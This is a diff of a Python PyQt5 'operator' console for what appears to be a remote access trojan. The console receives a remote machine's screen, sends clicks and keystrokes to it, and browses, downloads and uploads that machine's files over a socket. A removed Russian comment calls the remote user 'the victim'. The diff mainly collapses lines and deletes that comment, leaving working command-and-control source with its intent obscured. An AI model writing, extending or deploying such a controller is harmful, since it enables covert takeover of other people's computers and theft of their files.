@@ -1,5 +1,4 @@
 # language: Python, file: rdp_operator.py
-# *GUI: Ctrl+Insert — окно поверх; клик по картинке = клик на жертве*
 import socket, struct, json, base64, sys, threading, os
 from PyQt5 import QtWidgets, QtGui, QtCore
 from PyQt5.QtCore import Qt
@@ -49,8 +48,7 @@ class Operator(QtWidgets.QWidget):
         threading.Thread(target=self.accept_loop, daemon=True).start()
 
     def bring_front(self):
-        QtCore.QMetaObject.invokeMethod(self, "raise_front",
-                                       Qt.QueuedConnection)
+        QtCore.QMetaObject.invokeMethod(self, "raise_front", Qt.QueuedConnection)
 
     @QtCore.pyqtSlot()
     def raise_front(self):
@@ -71,20 +69,18 @@ class Operator(QtWidgets.QWidget):
                 self.send({"t": "list", "path": self.path_edit.text()})
                 threading.Thread(target=self.recv_loop, daemon=True).start()
             except Exception:
-                time.sleep(1)
+                import time; time.sleep(1)
 
     def recv_loop(self):
         while True:
             try:
                 msg = self.recv_msg()
-                if not msg:
-                    break
+                if not msg: break
                 if msg["t"] == "screen":
                     self.img_size = (msg["w"], msg["h"])
                     pm = QtGui.QPixmap()
                     pm.loadFromData(base64.b64decode(msg["d"]), "JPEG")
-                    scaled = pm.scaled(self.screen_label.size(),
-                                       Qt.KeepAspectRatio, Qt.SmoothTransformation)
+                    scaled = pm.scaled(self.screen_label.size(), Qt.KeepAspectRatio, Qt.SmoothTransformation)
                     self.screen_label.setPixmap(scaled)
                     x = (self.screen_label.width() - scaled.width()) // 2
                     y = (self.screen_label.height() - scaled.height()) // 2
@@ -93,27 +89,21 @@ class Operator(QtWidgets.QWidget):
                     self.path_edit.setText(msg["path"])
                     self.file_list.clear()
                     for it in msg["items"]:
-                        item = QtWidgets.QListWidgetItem(
-                            ("📁 " if it["dir"] else "📄 ") + it["name"])
+                        item = QtWidgets.QListWidgetItem(("📁 " if it["dir"] else "📄 ") + it["name"])
                         item.setData(Qt.UserRole, it)
                         self.file_list.addItem(item)
                 elif msg["t"] == "file":
-                    path, _ = QtWidgets.QFileDialog.getSaveFileName(
-                        self, "Save", os.path.basename(msg["path"]))
-                    if path:
-                        open(path, "wb").write(base64.b64decode(msg["d"]))
+                    path, _ = QtWidgets.QFileDialog.getSaveFileName(self, "Save", os.path.basename(msg["path"]))
+                    if path: open(path, "wb").write(base64.b64decode(msg["d"]))
                 elif msg["t"] == "err":
                     QtWidgets.QMessageBox.warning(self, "err", msg["msg"])
-            except Exception:
-                break
+            except Exception: break
 
     def to_remote(self, pos):
-        if not self.img_size or not self.pix_rect:
-            return None
+        if not self.img_size or not self.pix_rect: return None
         ox, oy, pw, ph = self.pix_rect
         rx, ry = pos.x() - ox, pos.y() - oy
-        if rx < 0 or ry < 0 or rx >= pw or ry >= ph:
-            return None
+        if rx < 0 or ry < 0 or rx >= pw or ry >= ph: return None
         w, h = self.img_size
         return int(rx * w / pw), int(ry * h / ph)
 
@@ -126,20 +116,17 @@ class Operator(QtWidgets.QWidget):
     def mouse_dclick(self, e):
         xy = self.to_remote(e.pos())
         if not xy: return
-        self.send({"t": "mouse", "x": xy[0], "y": xy[1], "click": True,
-                   "button": "left", "clicks": 2})
+        self.send({"t": "mouse", "x": xy[0], "y": xy[1], "click": True, "button": "left", "clicks": 2})
 
     def mouse_move(self, e):
         if e.buttons() & Qt.LeftButton:
             xy = self.to_remote(e.pos())
-            if xy:
-                self.send({"t": "mouse", "x": xy[0], "y": xy[1], "click": False})
+            if xy: self.send({"t": "mouse", "x": xy[0], "y": xy[1], "click": False})
 
     def keyPressEvent(self, e):
         if not self.sock: return
         k = e.text()
-        if k and k.isprintable():
-            self.send({"t": "type", "text": k})
+        if k and k.isprintable(): self.send({"t": "type", "text": k})
         else:
             key = self.qt_key(e.key())
             if key:
@@ -147,22 +134,12 @@ class Operator(QtWidgets.QWidget):
                 self.send({"t": "key", "key": key, "down": False})
 
     def qt_key(self, key):
-        m = {Qt.Key_Return: "enter", Qt.Key_Backspace: "backspace",
-             Qt.Key_Escape: "esc", Qt.Key_Tab: "tab", Qt.Key_Space: "space",
-             Qt.Key_Up: "up", Qt.Key_Down: "down", Qt.Key_Left: "left",
-             Qt.Key_Right: "right", Qt.Key_Home: "home", Qt.Key_End: "end",
-             Qt.Key_PageUp: "pageup", Qt.Key_PageDown: "pagedown",
-             Qt.Key_Delete: "delete", Qt.Key_F1: "f1", Qt.Key_F2: "f2",
-             Qt.Key_F3: "f3", Qt.Key_F4: "f4", Qt.Key_F5: "f5",
-             Qt.Key_F6: "f6", Qt.Key_F7: "f7", Qt.Key_F8: "f8",
-             Qt.Key_F9: "f9", Qt.Key_F10: "f10", Qt.Key_F11: "f11",
-             Qt.Key_F12: "f12"}
+        m = {Qt.Key_Return: "enter", Qt.Key_Backspace: "backspace", Qt.Key_Escape: "esc", Qt.Key_Tab: "tab", Qt.Key_Space: "space", Qt.Key_Up: "up", Qt.Key_Down: "down", Qt.Key_Left: "left", Qt.Key_Right: "right", Qt.Key_Home: "home", Qt.Key_End: "end", Qt.Key_PageUp: "pageup", Qt.Key_PageDown: "pagedown", Qt.Key_Delete: "delete", Qt.Key_F1: "f1", Qt.Key_F2: "f2", Qt.Key_F3: "f3", Qt.Key_F4: "f4", Qt.Key_F5: "f5", Qt.Key_F6: "f6", Qt.Key_F7: "f7", Qt.Key_F8: "f8", Qt.Key_F9: "f9", Qt.Key_F10: "f10", Qt.Key_F11: "f11", Qt.Key_F12: "f12"}
         return m.get(key)
 
     def open_item(self, item):
         data = item.data(Qt.UserRole)
-        if not data or not data["dir"]:
-            return
+        if not data or not data["dir"]: return
         path = self.path_edit.text().rstrip("\\/") + "/" + data["name"]
         self.send({"t": "list", "path": path})
 
@@ -180,18 +157,14 @@ class Operator(QtWidgets.QWidget):
         path, _ = QtWidgets.QFileDialog.getOpenFileName(self, "Upload")
         if not path: return
         data = base64.b64encode(open(path, "rb").read()).decode()
-        self.send({"t": "put",
-                   "path": self.path_edit.text().rstrip("\\/") + "/" + os.path.basename(path),
-                   "d": data})
+        self.send({"t": "put", "path": self.path_edit.text().rstrip("\\/") + "/" + os.path.basename(path), "d": data})
 
     def send(self, obj):
         if not self.sock: return
         data = json.dumps(obj).encode()
         with self.lock:
-            try:
-                self.sock.sendall(struct.pack("!I", len(data)) + data)
-            except Exception:
-                self.sock = None
+            try: self.sock.sendall(struct.pack("!I", len(data)) + data)
+            except Exception: self.sock = None
 
     def recv_msg(self):
         hdr = self.sock.recv(4)
